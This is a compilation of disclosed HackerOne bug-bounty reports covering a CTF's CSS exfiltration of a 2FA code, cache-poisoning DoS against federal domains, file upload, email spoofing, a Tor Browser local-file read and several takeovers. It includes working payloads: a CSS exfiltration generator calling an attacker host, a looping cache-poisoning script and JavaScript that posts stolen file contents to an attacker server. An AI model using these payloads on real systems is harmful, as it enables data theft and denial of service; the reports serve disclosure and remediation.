I obtained a new tab on home dashboard with our friend, marten.mickos user and password:

{F862661}

Finally, with this info, I got ready to help our favourite H1 CEO

##  FINAL BOSS: APP AGAIN T_T

Using the same technique as the other user I landed on APP site profile of Marten. Doing some searching, I found a payment.

{F862679}

So I pushed the button "Pay" and other page came to me:

{F862683}

This page requested a weird HTTP request, trying to request some CSS file...soooooo weird.

{F862684}

And then, the page requested you a 2FA code:

{F862685}

Ok, I didn't no idea how to attack this page...

Totally confuse, I've researching about CSS attacks and I found one: CSS Exfiltration. (@d0nut explains this vulnerability better than me, so take a look at this resource https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b)

With this idea, I started to do blind CSS exfiltration requests using above request and my VPS to allocate a personal CSS and receive the server responses:

I added this sentences to the CSS:

```input[name=^c][value]{ background-image:url(https://VPS-dir/css/jur1)};```

If the server tried to contact to my VPN that means that exists a HTML input with name starting with c. 

So doing this, I obtained that there were 7 inputs: code_1 to code_7. 

Ok, so the final idea was to generate a CSS file with all conditions and codes, so if the server tried to contact with the Burp Collaborator, the input value would show up.

So coding a Python script like this

```
part1 ="input[name=code_{}][value="
part2 = """]{ 
 	background-image:url(https://collabdir/css/code_"""
part3 = """ );
	}"""

all = [i for i in string.lowercase] + [i for i in string.uppercase] + [str(i) for i in range(0,10)]
for i in range(1,8):
	for c in all:
		print(part1.format(str(i))+c+part2+str(i)+c+part3)

```

I generated all combination of characters that input could have. I pushed that file to my personal VPS. And I did the request, pointing to my VPS file and waiting some requests to my Burp Collaborator:

And the requests appeared!!

{F862734}

Sorting the puzzle pieces I got the pass and then:

{F862718}

CTF was solved!!!! 

##^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$

## Impact

## Conclusions and Acknowledgements

This CTF has been very hard, but very cool too! I learnt some new trick for my bounty, like CSS Exfiltration or HPP with some special parameters.

I want to give thanks to Adam Langley to discover me a world of posibilities to learn and get some good time.

---

### [[H1-2006 2020] CTF](https://hackerone.com/reports/887993)

- **Report ID:** `887993`
- **Severity:** Critical
- **Weakness:** Violation of Secure Design Principles
- **Program:** h1-ctf
- **Reporter:** @jeti
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T15:29:49.530Z
- **CVE(s):** -

**Vulnerability Information:**

As there is a bonus for first 10 solutions for now I'll just post a flag.

F850100

## Impact

-

---

### [Unrestricted File Upload to ███████SubmitRequest/Index.cfm?fwa=wizardform](https://hackerone.com/reports/813395)

- **Report ID:** `813395`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2020-06-11T18:14:05.511Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
An attacker is able to upload files of any type to `███SubmitRequest/Index.cfm?fwa=wizardform` as long as they are less than 5 MB.

**Description:**
The █████ ████ Request System allows a user to submit requests to the ██████████ ███ for event support. An attacker can exploit this request form by uploading malicious files due to an unrestricted file upload feature.

## Impact
An attacker is able to upload malicious files onto the server. These files are attached to a request for support from the ██████ █████████. If a member of the ██████ ████ were to open the malicious file, the attacker could gain remote code execution on ████ information systems. Alternatively, if the attacker finds out how to browse to the file, they could obtain a web shell on the target, giving them remote code execution.

## Step-by-step Reproduction Instructions

1. Browse to `██████PublicSite/index.cfm?fwa=newreq` and click on `Create a New Request`.
██████████
2. Fill in your e-mail address and click `Submit`.
██████████
3. Fill out the fields in the form.
███
████
███
███████
4. Before submitting the request, click the `Upload Files` tab.
█████
5. This page will allow you to upload any file you wish as long as it is under 5MB in size. I tested by uploading an executable (visual studio community installer) and a php file. These files were deleted from my request after submitting this report.
███████
6. Once uploaded, you can submit your request. An attacker would need to submit this request in hopes of the █████ ████████ downloading the malicious attachment.

## Suggested Mitigation/Remediation Actions
Restrict file uploads to safe extensions such as .jpg, .png, etc. to prevent an attacker from uploading malicious files onto the server.

## Impact

An attacker is able to upload malicious files onto the server. These files are attached to a request for support from the ████ ██████████. If a member of the ████ ██████████ were to open the malicious file, the attacker could gain remote code execution on ██████ information systems. Alternatively, if the attacker finds out how to browse to the file, they could obtain a web shell on the target, giving them remote code execution.

---

### [Flaw in Change Email https://youtu.be/MMvlcHIGs2A](https://hackerone.com/reports/825643)

- **Report ID:** `825643`
- **Severity:** Critical
- **Weakness:** Violation of Secure Design Principles
- **Program:** Staging.every.org
- **Reporter:** @ahmd_halabi
- **Bounty:** - usd
- **Disclosed:** 2020-03-24T01:30:07.768Z
- **CVE(s):** -

**Summary (team):**

See https://youtu.be/MMvlcHIGs2A

---

### [Cache poisoning DoS to various TTS assets](https://hackerone.com/reports/728664)

- **Report ID:** `728664`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** GSA Bounty
- **Reporter:** @nathand
- **Bounty:** - usd
- **Disclosed:** 2020-03-12T16:02:40.277Z
- **CVE(s):** -

**Vulnerability Information:**

I have recently come across a technique to force a Cloudfoundry app to return a HTTP 404 error when requesting any resource, which contains cache friendly headers. What this means is, if the Cloudfoundry app in question is behind a web cache like Cloudfront or Cloudflare etc, it will possibly store a copy of the 404 error response as the cache for the resource being requested, which is served to other users. This describes a cache poisoning Denial of Service, and the concept for this is detailed at https://cpdos.org.

The technique to achieve CPDoS against a Cloudfoundry and hence TTS app is to send a request with the following header:

```
X-CF-APP-INSTANCE
```

This header is designed to allow admins to debug CF apps, by choosing which app instance they want serving their request. However, if we supply this header with a bad value, it will force the gorouter in the Cloudfoundry stack to issue a HTTP 404, e.g.:

```
X-CF-APP-INSTANCE: xxx:1
```

**Please note: I have already reported this to Pivotal/Cloudfoundry by contacting their security email address directly.** They have not yet confirmed the vulnerability, although I'm fairly confident the issue exists in gorouter. However, I thought it relevant to report this to you regardless, as you should be able to mitigate this vulnerability without waiting for Pivotal to release an update for gorouter, by configuring your web caches/WAFs appropriately (don't cache 404's, strip out this header etc). With that said, I understand if this report is not valid due to this - if this is the case, a heads up so I can close it from my end would be appreciated.

The following assets appear to be vulnerable:

```
analytics.usa.gov
federation.data.gov
18f.gsa.gov
code.gov
```

Please note that this is not an exhaustive list as I did not test against every asset in scope, however I did attempt the poisoning against `login.gov` and did not succeed, which I suspect might be because `login.gov` is specifically configured not to cache 404 errors. With that said, the config for `login.gov` may provide a means to protect the above listed assets and others that may be vulnerable.

## Proof of concept

To poison the cache for a resource, the following script can be used - in this case, `https://federation.data.gov/?cb=xxx` is being poisoned to serve a 404 error to other users. Please note the presence of the `?cb=xxx` query string - this is designed to be a "cache buster", to prevent poisoning the real home page. You may need to change the cache buster value to avoid hitting a previous successful cached copy.

```
#!/bin/bash

while true
do
    printf 'GET /?cb=xxx HTTP/1.1\r\n'\
'Host: federation.data.gov\r\n'\
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\r\n'\
'Accept: */*\r\n'\
'Accept-Language: en-US,en;q=0.5\r\n'\
'Accept-Encoding: gzip, deflate\r\n'\
'X-CF-APP-INSTANCE: xxx:1\r\n'\
'Connection: close\r\n'\
'\r\n'\
    | openssl s_client -ign_eof -connect federation.data.gov:443
    sleep 1
done
```

(FYI the poisoning script can probably sleep longer than 1 second - this is just to make sure the poisoning takes effect)

You should see 404 errors being returned in this script's output. Because the web cache appears to key on `Cookie` header values, this will only poison the cache for users without a pre-existing cookie for the domain (i.e. new users). This can be demonstrated by the following curl command (or by accessing the resource in a private browser window session without pre-existing cookies):

```
curl -i -s -k -X $'GET' \
    -H $'Host: federation.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \
    $'https://federation.data.gov/?cb=xxx'
```

If there are specific resources and assets which don't key cache on cookie headers, then these will probably be easier to exploit against more users. 

In this asset's case, the error will be:

```
404 Not Found: Requested route ('cg-06ab120d-836f-49a2-bc22-9dfb1585c3c6.app.cloud.gov') does not exist.
```

A bonus here is this error reveals an "internal" hostname otherwise not accessible to an attacker.

Given the assets all appear to use Cloudfront for caching, it is true that the poisoning will be regional - however, it is fairly trivial to acquire VPS' around the world (or perhaps just around the US in this case) to poison specific regions, and using a tool like https://www.nexcess.net/web-tools/dns-checker/, an attacker may be able to determine regional IPs for the asset, and poison regions by directly targeting them (not confirmed - I was aware of a technique to do this but was unable to confirm this).

One thing I did notice is these poisoning attacker requests may not hit the app logs in Cloudfoundry, e.g. the `cf logs APP_NAME` output, since it errors at the gorouter. If you have app logging dependent on displaying what is visible in the CF app logs, it may not detect these attacks.

## Impact

By exploiting this vulnerability, an attacker may be able to achieve denial of service for various TTS assets, particularly to new users.

---

### [Bypass Email Verification using Salesforce -- Reproducible in gitlab.com](https://hackerone.com/reports/617896)

- **Report ID:** `617896`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** GitLab
- **Reporter:** @ngalog
- **Bounty:** - usd
- **Disclosed:** 2019-12-13T21:00:19.953Z
- **CVE(s):** CVE-2019-5486

**Vulnerability Information:**

### Summary
The salesforce login integration allows attacker to bypass email verification -- user is able to signup with any email domain they want, effectively bypass all email domain whitelist/blacklist restriction or any other 3rd party using gitlab instance's email address.

It is possible because salesforce allow admin to create user with arbitrary email, and I believe this is what gitlab engineer forgot to consider while implementing salesforce integration.

Please follow along to see how I was able to create an account `███████` in gitlab.com

### Steps to reproduce
- Visit https://bugcrowd-ngalog-3.oktapreview.com/
- Enter creds `██████████`:`██████████`
- Click salesforce to login salesforce
- Open new tab and visit https://gitlab.com/users/sign_in
- Click login with salesforce
- you will be logged in as `████` by visiting `https://gitlab.com/profile/emails`



### Impact
Bypass email domain restriction and able to signup with arbitrary email domain

### What is the current *bug* behavior?
Able to signup with any email domain

### What is the expected *correct* behavior?
should need email verification


### Relevant logs and/or screenshots
{F511255}

## Impact

described above

---

### [Missing Protection Mechanism in Mail Servers allows malicious user to use staff.ratelimited.me email could lead to identity theft.](https://hackerone.com/reports/486667)

- **Report ID:** `486667`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** RATELIMITED
- **Reporter:** @notexist
- **Bounty:** - usd
- **Disclosed:** 2019-02-02T10:28:36.030Z
- **CVE(s):** -

**Vulnerability Information:**

Hello ratelimited,

I'm not really sure how your mail servers being configured but i guess there is a mis-configuration or missing protection mechanism that fails to verify if the email that is going to be sent are only made by authorized ratelimited staff only. From this point of view a malicious user could sent an email to a victim by using valid and email owned by staffs of ratelimited and to be specific one of them are `gtsatsis@staff.ratelimited.me` and i can surely tell it is based on #369581 wherein a team member acknowledge the hacker that is will be given a reward for efforts.

### So what now ?
If a malicious user could use `gtsatsis@staff.ratelimited.me` to send emails through the abuse of misconfigured mail server with missing protection, they can spread fake message from this point and make the reputation of ratelimited staffs and management bad from others point of view.

### POC 
I've attack my own email and tries to exploit the issue.
Here my gmail account has been received email from `gtsatsis@staff.ratelimited.me` says that i've received reward from ratelimited. If a normal user would received this email, they will not hesitate to claim the reward thinking that came from and request being done and sent by legitimate staff from ratelimited but it is actually not.
{F412930} 

### How could we verify this ?
Here is the steps to reproduce the issue:
- I use 3rd party email faker `emkei.cz` to use spoof email of `gtsatsis@staff.ratelimited.me`.
- Just compose a normal email and not forget to put email of the victim.
- Send the email.

### Still, who cares or implement mail protections from their servers ?
Hackerone itself is already done this way back years ago. They configured their mail server so whenever a malicious user could use @hackerone.com and tries to send mail using it from distributing messages. Hackerone mail server will prevent this before sending it to desired victim. And so facebook does, In case you want to verify this. Try the steps to reproduce above against the said website and you see the attack will never succeed on `*@hackerone.com` nor `*.facebook.com`.

> Don't get me wrong but this attack only made possible by opening ratelimited itself a window for exploitation.

Regards,
Mart Gil

## Impact

Could distribute fake email content/files using `gtsatsis@staff.ratelimited.me` or any email used by ratelimited. As a result, ratelimited will have a bad reputation and this can also be use by any counterpart company of ratelimited.

---

### [SSLv3 Poodle Vulnerability](https://hackerone.com/reports/220116)

- **Report ID:** `220116`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** FormAssembly
- **Reporter:** @pandaonair
- **Bounty:** - usd
- **Disclosed:** 2018-11-24T05:22:52.404Z
- **CVE(s):** -

**Vulnerability Information:**

Hey there,
I tested against POODLE MITM and enterprisedemo.formassembly.com is vulnerable, I simply went into terminal and used this command 
    "openssl s_client -connect enterprisedemo.formassembly.com:443 -ssl3"

POC

How to fix: Disable SSLv3

---

### [Private program email forwarding response invitation not expire after first use.](https://hackerone.com/reports/209140)

- **Report ID:** `209140`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** HackerOne
- **Reporter:** @japz
- **Bounty:** - usd
- **Disclosed:** 2018-05-30T00:28:23.357Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

Hi Hackerone Team,

Before i reported that email forwarding of private can be enumerated and any user join to private program here #201369 , __but this seems by design__, but now it i found a related issue which can cause a security impact on private program because the email forwarding response of `HackerOne` did not expire after first use.

**Description (Include Impact):**

If a user __Quits__ to a private program, this user can rejoined without the knowledge of private program owners, also you can check further if the user become Banned it seems that the linked on email still not expire and this can cause security implication if the banned user can rejoined to the program without the knowledge of the program owner, for reproduction steps please see below.

### Steps To Reproduce

1. Send a test mail to `█████████` which is private and have email forwarding setup.
2. Click and follow the link on the email response and you become auto invited to the program (intentional).
3. __NO NOT__ submit the test report (__means the email link already used, but you did not continue to submit the report, you are now participants to the program__).
4. Now Quit to the program.
5. Go to email and click the same link and you can get back without requesting another link (using submit report via email forwarding)

__Link on the email response of forwarding feature should expire after first use__
{F164319}

### Impact:

When the user quits, or if the program owner dicided to remove/banned the user on participating private program, the user should not get back unless the program owners decide to un-banned and the user/researcher gets invited again. 

### Mitigation:

The email forwarding feature should expire after it's first use, do not allow the attacker to reused the link to join to the program.

Please ask if you need more information.

Regards
Japz

---

### [Access to local file system using javascript](https://hackerone.com/reports/258630)

- **Report ID:** `258630`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** Tor
- **Reporter:** @cuso4
- **Bounty:** - usd
- **Disclosed:** 2017-11-18T09:28:06.412Z
- **CVE(s):** -

**Vulnerability Information:**

Issue :

Access to local file system using javascript(slightly xss on server side )

The browser can access the local files using iframes with a local html file. this is very normal and often used for local web development but javascript shouldn't be able to get the content of that iframe because this can be used to post the contents to the attackers server. something else I noticed is that it's not limited to the same directory.


Steps to Reproduce :


save a html file from here and open in tor browser .

<html>
<body>
<div id='div1'>
</div>
<script>
current_href = document.location.href
frame = document.createElement('iframe'); frame.src = current_href.replace('file:///home/jnsjns/Desktop/poc5.html', 'file:///home/jnsjns/Desktop/1.txt'); frame.id = 'frm'; document.getElementById('div1').appendChild(frame)
setTimeout(function func(){loot = document.getElementById('frm').contentWindow.document.getElementsByTagName('pre')[0].innerHTML
alert('Your data is: ' + loot)
}, 500)
</script>
</body>
</html>



Explaination :  file:///home/jnsjns/Desktop/poc5.html  this is my test html here.

                file:///home/jnsjns/Desktop/1.txt is server side local file in tor browser 

the private file is coming by popup (I have tested in chrome -Google ,they are safe from this )


What attacker can do ?


I would have been able to post it to my server using jquery like this.

//Gets data from iframe and saves it to the getdata variable
getdata = document.getElementsByTagName('frm')[0].contentWindow.document.getElementsByTagName('pre')[0].innerHTML
//Posts to the php server located at 192.168.0.102 (local address for demo purposes)
$.ajax({type: "POST", url: "http://192.168.0.102/post.php", data: {string:getdata}});}


This issue may critical .


Regards.

---

### [Exposed API-key allows to control nightly builds of firmwares (█████████ & ████████)](https://hackerone.com/reports/179986)

- **Report ID:** `179986`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** Ubiquiti Inc.
- **Reporter:** @tripwire
- **Bounty:** - usd
- **Disclosed:** 2017-10-09T11:31:18.070Z
- **CVE(s):** -

**Summary (team):**

The researcher found a public API token that was mistakenly granted full-access permission, which allowed the creation/overwrite of nightly builds of UniFi Firmware.

**Summary (researcher):**

Publicly available api-key granted full access permissions to API that controls nightly builds of Ubiquiti firmwares, i.e. it was possible to upload new builds and modify existing ones.

---

### [{REDACTED}.data.gov subdomain takeover.](https://hackerone.com/reports/263902)

- **Report ID:** `263902`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** GSA Bounty
- **Reporter:** @edoverflow
- **Bounty:** - usd
- **Disclosed:** 2017-09-06T14:44:04.619Z
- **CVE(s):** -

**Summary (team):**

@edio discovered a number of related subdomain takeover attacks against some subdomains of data.gov. 
 
Technically, these domains are out of scope for our [Vulnerability Disclosure Policy](https://github.com/18F/vulnerability-disclosure-policy/blob/master/vulnerability-disclosure-policy.md). We want to remind hackers to please limit their testing to domains explicitly listed in that scope (which is repeated on [our HackerOne program page](https://hackerone.com/tts) for convenience). This is for your own safety: we want to be sure that everyone's on the same page about your activities being authorized.

That said, this was a legitimate vulnerability, which we fixed, and we're disclosing details because they may be useful to other folks who operate services like ours.

We couldn't just remove the DNS entries, since those are used for internal purposes with agency CNAMEs. However, there were other ways we were able to resolve this by routing requests for unknown domains differently, and now serve 404s for these subdomains.

A few more details about the cause and solutions:

* For the subdomain in question, this was caused by a combination of how were routing requests to unknown domains and how we served static websites.
* The basic issue was that our servers used our `{REDACTED}.data.gov` domain as a fallback for any unknown domain requests routed to us. So if a request came in for particular subdomains, we would end up treating it sort of like a request to `https://{REDACTED}.data.gov`. Since we proxied our home page requests to the same host where `{REDACTED}.data.gov`'s static site is currently hosted, and we passed along the original HTTP Host header for these unknown domains, it meant that the host would respond as if that unknown domain had been accessed directly on that host. As demonstrated, users could then to serve up content on these other domains.
* So all that being said, the fix was actually straightforward, since it just involved disabling using the `{REDACTED}.data.gov` website as a fallback for unknown domains. This should mean that the only requests we forward now are actually ones for the `{REDACTED}.data.gov` domain.

Thanks for the find, @edio - we really appreciate it!

[See also #263542, which was an independent discovery of the same issue on a different subdomain.]

**Summary (researcher):**

Using a combination of tools and techniques described in https://edoverflow.com/2017/github-recon/, I was able to take control of 7 different subdomains linked to {REDACTED}.data.gov.

Working with the TTS was a pleasure, thanks to their fast responses and quick resolution times. On top of that, they took the extra time to explain the root cause to me so I could better understand what was happening. Once again, thank you to the TTS and I look forward to working with them again in the future!

---

### [out of date disqus shortname usage in the web app source code](https://hackerone.com/reports/172780)

- **Report ID:** `172780`
- **Severity:** Critical
- **Weakness:** Violation of Secure Design Principles
- **Program:** Starbucks
- **Reporter:** @hiorws
- **Bounty:** - usd
- **Disclosed:** 2017-08-12T01:40:57.248Z
- **CVE(s):** -

**Vulnerability Information:**

**Short definition of bug**: Misusage of an third-party web service in http://www.starbucks.com/

Hi Starbucks Bug Bounty Team, I found a vulnerability on your global website. I think you migrate your blog from http://www.starbucks.com/blog/archive/starbucks to https://1912pike.com/ and the blog path is also active and in-service still. Also the old blog posts are listed from the search in the main page of your website.

If we inspect the page source of any blog post page under the path http://www.starbucks.com/blog/ , we will see the disqus embedding codes still active.  

i.e. checkout the page source of this page:
http://www.starbucks.com/blog/starbucks-digital-network-content-highlights/612

```html
<script>
		
	var	disqus_params = {	shortname :'████', 
							developerMode : false, 
							hash :'██████████', 
							publicKey :'█████',
							identifier : 'TEST/blog/starbucks-digital-network-content-highlights/612',
							url :'http://www.starbucks.com/blog/starbucks-digital-network-content-highlights/612',
							ssoName : 'Starbucks',
							signinUrl : '/account/signin?skin=sdn&returnURL=/Disqus/CloseWindow',
							mobileSignInURL : '/account/signin?skin=sdn&returnURL=http://www.starbucks.com/blog/starbucks-digital-network-content-highlights/612',
							signoutURL : '/account/signout?skin=sdn&returnURL=/blog/starbucks-digital-network-content-highlights/612',
							signInButton : 'http://www.starbucks.com/static/images/signin.png', 
							signInIcon :'http://www.starbucks.com/static/images/sb-logo-16.gif'
						};
						
			
						/*TODO: Temp Hack*/

if( navigator.userAgent.match(/Android/i)
 || navigator.userAgent.match(/webOS/i)
 || navigator.userAgent.match(/iPhone/i)
 || navigator.userAgent.match(/iPad/i)
 || navigator.userAgent.match(/iPod/i)
 ){
	disqus_params.signinUrl="/account/signin?skin=sdn&returnURL=" + window.location.href;
}
	
</script>
```

and also at the end of source code

```html
<script src="/static/resource/disqus_js/1315595364_en-US"></script>
```

http://www.starbucks.com/static/resource/disqus_js/1315595364_en-US 
the js code is still in the server and in-service.

as you see in the page source code, the disqus shortname is ████ which is deprecated. I wonder and check from the disqus the “████████” shortname is not under usage. And i take that shortname as a regular user of disqus.  

Consequently whole the administration of “█████████” discussion board belongs to me. This is the best case. For a company -which is focused on customer pleasure and has total stores: 22,519* (as of June 28, 2015)- this fault can cause lots of impression such as;

- unconfirmed comments on your website
- unpleasant images as a default avatar in comments section
- undesired comments imported with older date can be shown as by name Starbucks etc.

I recommendation to solve this issue immediately;

remove the js code in blog post template code
let me know the time to transfer the ownership of “██████” disqus shortname

I am very pleased to report this issue instantly.

Have a nice work and thank you so much.

---

### [An unsafe design practice in the Passphrase may result in Secret being accidentally changed.](https://hackerone.com/reports/218324)

- **Report ID:** `218324`
- **Severity:** High
- **Weakness:** Violation of Secure Design Principles
- **Program:** Phabricator
- **Reporter:** @kevin_c
- **Bounty:** - usd
- **Disclosed:** 2017-04-04T05:10:38.594Z
- **CVE(s):** -

**Vulnerability Information:**

Summary:
An unsafe design practice in the Passphrase may result in Secret being accidentally changed.
Preface:
If a user wants to share his/hers secrets, he/she may use the Passphrase. But when he/she created the credential and setted who can view it and who can edit it, they will soon discover that if they not set the edit permission to the one they want to share secret with, it is impossible success. Naturally, they would give the edit permission to everyone they want to share the secret with. So, here is the problem. It means they can change the secret. If someone ignores the edit records, he/she may under attack inadvertently. Because the secret has been modified.
Reproduction steps:
Open three different browsers (to simulate three different users)
BROWSER A: Log in as user A
BROWSER B: Log in as user B
BROWSER C: Log in as user C
BROWSER A: Go to the Passphrase and create new credential. Make it visible to both user A user B and user C. Make it editable to only user A.
BROWSER B: Open the https://yourdomain.com/K1(your id) and discover it is impossible to show the secret.
BROWSER A: Make it editable to both user A user B and user C.
BROWSER B: User B can see the secret and can change it.
BROWSER C: Open the https://yourdomain.com/K1(your id) but only can see the the secret has been modified.

Please fix it right away.

Best regards,
Kevin C.

---
